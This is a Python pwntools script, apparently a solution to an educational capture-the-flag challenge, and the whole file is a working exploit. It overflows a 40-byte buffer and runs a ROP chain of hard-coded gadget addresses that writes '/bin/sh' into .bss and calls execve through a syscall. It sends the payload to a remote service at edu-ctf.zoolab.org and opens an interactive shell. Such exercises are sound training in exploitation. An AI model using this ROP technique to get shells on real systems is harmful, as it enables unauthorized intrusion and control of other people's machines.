import pwn

pwn.context.log_level = "debug"
pwn.context.arch = "amd64"

bss_addr = 0x4c72a0 # .bss address
mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret
pop_rax = 0x447b27 # pop rax ; ret
pop_rsi = 0x409e6e # pop rsi ; ret

pop_rdi = 0x401e3f # pop rdi ; ret
pop_rax_pop_rdx_pop_rbx = 0x47ed0a # pop rax ; pop rdx ; pop rbx ; ret
syscall = 0x401bf4 # syscall

payload = pwn.flat(
b"A" * 40,
pop_rax, b"/bin/sh\0", # rax <- '/bin/sh'
pop_rsi, bss_addr, # rsi <- 0x4c72a0
mov_rsi_rax, # [0x4c72a0] <- '/bin/sh'

pop_rdi, bss_addr,
pop_rsi, 0,
pop_rax_pop_rdx_pop_rbx, 0x3b, 0, 0,
syscall,
)

p = pwn.remote("edu-ctf.zoolab.org", 10003)
p.recvuntil(b"show me rop\n> ")

p.sendline(payload)
p.interactive()